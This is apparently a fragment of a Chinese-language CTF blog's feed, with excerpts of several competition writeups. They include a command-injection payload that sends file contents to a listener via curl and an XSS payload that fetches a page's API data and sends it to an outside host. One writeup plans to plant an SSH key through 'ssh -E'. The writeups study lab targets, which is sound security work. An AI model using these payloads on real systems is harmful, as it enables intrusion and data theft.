+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>來看看他怎麼檢查的。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#a6e22e">check&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span> =&amp;gt; {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">typeof&lt;/span>(&lt;span style="color:#a6e22e">ast&lt;/span>) &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#39;string&amp;#39;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">prop&lt;/span> &lt;span style="color:#66d9ef">in&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">prop&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span>[&lt;span style="color:#a6e22e">prop&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Redirect&amp;#39;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">prop&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#39;type&amp;#39;&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span>[&lt;span style="color:#a6e22e">prop&lt;/span>] &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#e6db74">&amp;#39;Command&amp;#39;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">ast&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;text&amp;#39;&lt;/span>] &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#a6e22e">ast&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;name&amp;#39;&lt;/span>][&lt;span style="color:#e6db74">&amp;#39;text&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;echo&amp;#39;&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#a6e22e">check&lt;/span>(&lt;span style="color:#a6e22e">ast&lt;/span>[&lt;span style="color:#a6e22e">prop&lt;/span>])) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然後用 &lt;a href="https://vorpaljs.github.io/bash-parser-playground/">bash-parser-playground&lt;/a> 看看 ast 的結構。&lt;/p></description></item><item><title>AIS3 EOF 2024 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/</link><pubDate>Mon, 08 Jan 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-eof-2024-writeup/</guid><description>&lt;h2 id="misc">Misc&lt;/h2>
+&lt;h3 id="welcome">Welcome&lt;/h3>
+&lt;h4 id="題目">題目&lt;/h4>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a74a45e2-8fbb-42d3-bcbc-0b8c488789c5" alt="image">&lt;/p>
+&lt;h4 id="flag">Flag&lt;/h4>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ac494f35-2f7e-4ccd-b244-5f049e7c83ea" alt="image">&lt;/p>
+&lt;p>&lt;code>AIS3{W3lc0mE_T0_A1S5s_EOF_2o24}&lt;/code>&lt;/p>
+&lt;h2 id="web">Web&lt;/h2>
+&lt;h3 id="dns-lookup-tool-final">DNS Lookup Tool: Final&lt;/h3>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f415e3ed-1266-43e2-88fb-a1e6681cee27" alt="image">&lt;/p>
+&lt;h4 id="webpage">Webpage&lt;/h4>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/41cfd043-3fe8-4141-81d3-f057901a04bc" alt="image">&lt;/p>
+&lt;h4 id="解題">解題&lt;/h4>
+&lt;p>正常&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a81ed269-8b81-4b17-9c49-06cd95765705" alt="image">&lt;/p>
+&lt;p>不存在 domain&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8c1547f0-025c-4875-aafd-3315a68e9d46" alt="image">&lt;/p>
+&lt;p>使用違規字元&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/2dbd2b38-8128-4883-95cd-aa7f50ee911f" alt="image">&lt;/p>
+&lt;p>讀 code 找到 blacklist&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/68686376-29a6-4bbc-bca0-3c63da797b1f" alt="image">&lt;/p>
+&lt;p>發現 &lt;code>$()&lt;/code> 沒檔，測一下&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/525b06b2-d309-47a2-976d-70058bd30fb4" alt="image">&lt;/p>
+&lt;p>過了&lt;/p>
+&lt;h4 id="exploit">exploit&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask &lt;span style="color:#f92672">import&lt;/span> Flask,request,redirect,Response
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>app &lt;span style="color:#f92672">=&lt;/span> Flask(__name__)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@app.route&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>,methods&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;GET&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;POST&amp;#39;&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">root&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(request&lt;span style="color:#f92672">.&lt;/span>stream&lt;span style="color:#f92672">.&lt;/span>read()&lt;span style="color:#f92672">.&lt;/span>decode())
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;com&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@app.route&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/&amp;lt;path:data&amp;gt;&amp;#39;&lt;/span>,methods&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;GET&amp;#39;&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">run&lt;/span>(data):
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(data)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;com&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> app&lt;span style="color:#f92672">.&lt;/span>run(host&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;::&amp;#34;&lt;/span>, port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="payload">payload&lt;/h4>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>curl http://10.105.0.21:21520/ -d &lt;span style="color:#e6db74">&amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(ls /)&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl http://10.105.0.21:21520/ -d &lt;span style="color:#e6db74">&amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(cat /flag_SWeUMks9hGYFciax)&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl http://10.105.0.21:21520/ -d &lt;span style="color:#e6db74">&amp;#39;name=example.$(curl 10.105.2.22 -d &amp;#34;$(cat /$(echo f)lag_SWeUMks9hGYFciax)&amp;#34;)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="flag-1">Flag&lt;/h4>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/481aad11-e682-4ccc-8333-a8f3f62d337e" alt="image">&lt;/p></description></item><item><title>TSCCTF 2024 Official WriteUp</title><link>https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/</link><pubDate>Fri, 05 Jan 2024 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/tscctf-2024-official-writeup/</guid><description>&lt;h1 id="tscctf-2024-official-writeup">TSCCTF 2024 Official WriteUp&lt;/h1>
+&lt;p>這次與 TSC 的夥伴們一起舉辦了一場 CTF 比賽，而我則負責 infra 的建置以及出一題 reverse 題目，雖說我似乎難度沒有控好，還在學習控難度中。&lt;/p>
+&lt;h1 id="just-shooting-game">Just Shooting Game&lt;/h1>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/0137c941-cfd6-41f6-a329-52e6cfdff2de" alt="image">&lt;/p>
+&lt;p>基本上這題最大的難點有兩個：&lt;/p>
+&lt;ol>
+&lt;li>取得 magic 值&lt;/li>
+&lt;li>&lt;del>通靈出&lt;/del> Transfer.exec 是某種 bytecode interpreter ，然後把解出來的 code 丟 IDA 之類的解析。&lt;/li>
+&lt;/ol>
+&lt;h2 id="解題">解題&lt;/h2>
+&lt;p>這題 code 用 &lt;code>ILSpy&lt;/code> 逆會比較完整，但是這邊 writeup 還是用 Dnspy 寫。&lt;/p>
+&lt;p>DnSpy 打開 &lt;code>ShootingGame_Data\Managed\Assembly-CSharp.dll&lt;/code> 會發現有一些 Class 有一個叫 &lt;code>code&lt;/code> 的 string variable 裡面塞了一坨奇怪的東西，decode 以後會發現這些都 emoji。&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/be16b075-60a1-42c0-8587-f80b934e9ba8" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/880a248f-13de-40f2-8eeb-cfc99e405ea5" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/3cf4e779-ceb6-428a-8a60-530322d90fd1" alt="image">&lt;/p>
+&lt;p>這些 &lt;code>code&lt;/code> 會在該 Class 裡和一個叫 &lt;code>magic&lt;/code> 的變數做 &lt;code>Transfer.etob&lt;/code> 運算以後，跟一些參數一起跑 &lt;code>Transfer.exec&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://github.com/Jimmy01240397/My-CTF-Challenges/assets/57281249/e19af70d-a9c9-4e8e-a955-aa58db05ad20" alt="image">&lt;/p>
+&lt;p>通過與 &lt;code>gun&lt;/code>、&lt;code>enemy&lt;/code> 等等 Class 比對後，發現 &lt;code>GameManager&lt;/code> 是送入一個字串 Call &lt;code>Transfer.exec&lt;/code> 以後會依據 Call 完後所得到的 value variable 轉成 Boolean 並判斷如果為 True 就把 &lt;code>supermode&lt;/code> 設為 True，觀察 &lt;code>gun&lt;/code> class 會發現 &lt;code>supermode&lt;/code> 會讓玩家進入無敵狀態並沒有攻擊速度限制，應該是一個打入作弊代碼會開啟作弊模式的東西。其他 Call &lt;code>Transfer.exec&lt;/code> 的地方都是在做字串比對，可以判斷 &lt;code>Transfer.exec&lt;/code> 會依據 &lt;code>code&lt;/code> 跟 &lt;code>magic&lt;/code> 運算後的 byte array 做相應的事情，但是 &lt;code>Transfer.exec&lt;/code> 到底做了甚麼還不清楚，同時因為只有 &lt;code>GameManager&lt;/code> 不是字串比對，所以目標可能在這裡，猜測那個作弊代碼可能就是 flag。&lt;/p></description></item><item><title>BALSN 2023 WriteUp</title><link>https://blog.chummydns.com/blogs/balsn-2023-writeup/</link><pubDate>Wed, 18 Oct 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/balsn-2023-writeup/</guid><description>&lt;h1 id="balsn-2023-writeup">balsn-2023-writeup&lt;/h1>
+&lt;p>與 B33f 50UP 戰隊一起合打的。&lt;/p>
+&lt;h2 id="戰績">戰績&lt;/h2>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/c90ad3e2-3195-4f15-9c40-658aa691e53e" alt="image">&lt;/p>
+&lt;h2 id="kshell">KShell&lt;/h2>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/37a8e79e-ad82-44d4-9139-8b23fa340fba" alt="image">&lt;/p>
+&lt;p>連到 &lt;code>nc kshell.balsnctf.com 7122&lt;/code> 會有一個受限的 shell 要做逃脫，用 &lt;code>help&lt;/code> 看能用的指令只有這些，沒有 pipe 沒有 redirect&lt;/p>
+&lt;p>&lt;img src="https://github.com/user-attachments/assets/b97f8b7b-1a6f-4a73-a621-760c864e93da" alt="image">&lt;/p>
+&lt;p>裡面最複雜的應該是 &lt;code>ssh&lt;/code> 所以從他開刀。思路大概是想辦法找到 &lt;code>自由寫檔&lt;/code> 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。
+原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 &lt;code>&amp;lt;username&amp;gt;@&amp;lt;hostname&amp;gt; Permission denied (publickey)&lt;/code> 的 log。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -E .ssh/authorized_keys &lt;span style="color:#e6db74">&amp;#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy&amp;#34;&lt;/span>@localhost
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然而在裡面測試後發現他的 ssh Permission denied 訊息沒有 username 如：&lt;code>Permission denied (publickey)&lt;/code> 這就頭痛了。後來有想到用 filename。&lt;/p></description></item><item><title>AIS3 Pre Exam 2023 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/</link><pubDate>Tue, 23 May 2023 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-pre-exam-2023-writeup/</guid><description>&lt;h2 id="welcome">Welcome&lt;/h2>
+&lt;h3 id="題目">題目&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/239931158-52040d8d-3a45-495a-a298-20160a8da1bf.png" alt="image">&lt;/p>
+&lt;h3 id="解題">解題&lt;/h3>
+&lt;p>讀一下 &lt;a href="https://github.com/Jimmy01240397/CTF-writeup/blob/master/ais3-pre-exam-2023-writeup/Welcome/welcome.pdf">pdf&lt;/a>&lt;/p>
+&lt;h2 id="e-portfolio-baby">E-Portfolio baby&lt;/h2>
+&lt;h3 id="題目-1">題目&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/239947968-58cebf9a-2d90-4e46-962c-708821270e0e.png" alt="image">&lt;/p>
+&lt;h3 id="解題-1">解題&lt;/h3>
+&lt;p>網頁進來是登入介面
+&lt;img src="https://user-images.githubusercontent.com/57281249/239949795-ccaa3dcf-f7dd-486e-9ceb-ef88c53b4639.png" alt="image">&lt;/p>
+&lt;p>About 那邊可以放 html 看起來可以 XSS
+&lt;img src="https://user-images.githubusercontent.com/57281249/239949939-80bef056-5b2f-411e-9dee-ac420c3487e7.png" alt="image">&lt;/p>
+&lt;p>測一下
+&lt;img src="https://user-images.githubusercontent.com/57281249/239950346-3fe6900c-5d62-4690-9550-4aaaa7115e5c.png" alt="image">&lt;/p>
+&lt;p>看起來可以
+&lt;img src="https://user-images.githubusercontent.com/57281249/239950395-1559651a-26a4-4397-8bf6-c4c143e47259.png" alt="image">&lt;/p>
+&lt;p>用 flask 隨便寫個 server 聽 request&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> flask &lt;span style="color:#f92672">import&lt;/span> Flask,request,redirect,Response
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>app &lt;span style="color:#f92672">=&lt;/span> Flask(__name__)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@app.route&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>,methods&lt;span style="color:#f92672">=&lt;/span>[&lt;span style="color:#e6db74">&amp;#39;GET&amp;#39;&lt;/span>])
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">data&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(request&lt;span style="color:#f92672">.&lt;/span>args)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#e6db74">&amp;#34;aaa&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> app&lt;span style="color:#f92672">.&lt;/span>run(host&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;0.0.0.0&amp;#34;&lt;/span>,port&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>payload&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-html" data-lang="html">&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">h5&lt;/span>&amp;gt;Hello!&amp;lt;/&lt;span style="color:#f92672">h5&lt;/span>&amp;gt;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I am a &amp;lt;&lt;span style="color:#f92672">span&lt;/span> &lt;span style="color:#a6e22e">style&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;color: red;&amp;#34;&lt;/span>&amp;gt;new&amp;lt;/&lt;span style="color:#f92672">span&lt;/span>&amp;gt; user.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;&lt;span style="color:#f92672">img&lt;/span> &lt;span style="color:#a6e22e">src&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">x&lt;/span> &lt;span style="color:#a6e22e">onerror&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;fetch(&amp;#34;/api/portfolio&amp;#34;).then(res =&amp;gt; res.json()).then(data =&amp;gt; {fetch(`http://10.113.193.20?${new URLSearchParams(data.data)}`)})&amp;#39;&lt;/span>/&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>送去給 admin
+&lt;img src="https://user-images.githubusercontent.com/57281249/239951160-ce6aab2d-05dc-4a7a-a1bf-d611321778b6.png" alt="image">&lt;/p>
+&lt;p>然後就收到 flag 了
+&lt;img src="https://user-images.githubusercontent.com/57281249/239951318-cdb64a68-3280-4d77-89e7-068574d94b4f.png" alt="image">&lt;/p>
+&lt;h3 id="flag">Flag&lt;/h3>
+&lt;p>&lt;code>AIS3{&amp;lt;img src=x onerror='fetch(...}&lt;/code>&lt;/p>
+&lt;h2 id="managementsystem">ManagementSystem&lt;/h2>
+&lt;h3 id="題目-2">題目&lt;/h3>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/239945264-fe5fdba3-c448-4cb5-a992-c3e0e517a49e.png" alt="image">&lt;/p></description></item><item><title>HITCON CTF 2021 Writeup</title><link>https://blog.chummydns.com/blogs/hitconctf-2022-writeup/</link><pubDate>Mon, 28 Nov 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/hitconctf-2022-writeup/</guid><description>&lt;h1 id="hitconctf-2022-writeup">hitconctf-2022-writeup&lt;/h1>
+&lt;h2 id="戰績">戰績&lt;/h2>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/204162751-27c34090-7cab-418d-a0ec-0379f0e99436.png" alt="image">
+&lt;img src="https://user-images.githubusercontent.com/57281249/204162537-eb1eceec-010c-4b65-b228-5b43ec9535bb.png" alt="image">&lt;/p>
+&lt;h2 id="checker">checker&lt;/h2>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/204158150-d012979f-8227-450d-a458-be0d2ffa67f9.png" alt="image">&lt;/p>
+&lt;p>Disassemble checker.exe and checker_drv.sys using IDA Pro. We can know that the checker sends the 0x222080u code to the checker_drv driver to check if there is a &amp;ldquo;hitcon&amp;rdquo; at address 0x140003000.&lt;/p>
+&lt;p>checker.exe:&lt;/p>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/204158308-726e9f4c-04f3-48de-b588-0a1f603af5a0.png" alt="image">&lt;/p>
+&lt;p>checker_drv.sys:&lt;/p>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/204158381-0616e107-20b6-4e4c-9fa7-6c7e6e5cf9fc.png" alt="image">&lt;/p>
+&lt;p>Also, there are other codes that can be sent that will use the data from addresses 0x140003030 to 0x14000312F to change the function at address 0x14001B30, and then use that function to calculate the hex data from addresses 0x140003000 to 0x14000302A.&lt;/p></description></item><item><title>AIS3 Pre Exam 2022 Writeup</title><link>https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/</link><pubDate>Tue, 17 May 2022 00:00:00 +0800</pubDate><guid>https://blog.chummydns.com/blogs/ais3-pre-exam-2022-writeup/</guid><description>&lt;h1 id="score-board">Score Board&lt;/h1>
+&lt;p>&lt;img src="https://img.stoneapp.tech/t510599/ais3-2022/pre-exam/scoreboard.jpeg" alt="">&lt;/p>
+&lt;h2 id="welcome">Welcome&lt;/h2>
+&lt;h3 id="welcome-1">Welcome&lt;/h3>
+&lt;h4 id="題目">題目&lt;/h4>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168672745-6364d25f-e6b4-4251-a29b-7cc411ce8bfa.png" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168672792-4825a156-fd38-49e1-a414-b1dcba2e3d41.png" alt="image">&lt;/p>
+&lt;h4 id="flag">Flag&lt;/h4>
+&lt;p>&lt;code>AIS3{WTF did I just see the FLAG before CTF starts?}&lt;/code>&lt;/p>
+&lt;h2 id="misc">Misc&lt;/h2>
+&lt;h3 id="excel">Excel&lt;/h3>
+&lt;h4 id="題目-1">題目&lt;/h4>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168673095-490e4d69-2bf8-46b4-a8ce-468e4f4bf633.png" alt="image">&lt;/p>
+&lt;h4 id="解題">解題&lt;/h4>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168673322-8f21320d-a696-45ab-a92f-a616c09139e6.png" alt="image">&lt;/p>
+&lt;p>&lt;img src="https://user-images.githubusercontent.com/57281249/168673375-2a2c9327-2e50-41cc-b0d2-63d1f2d4e95c.png" alt="image">&lt;/p>
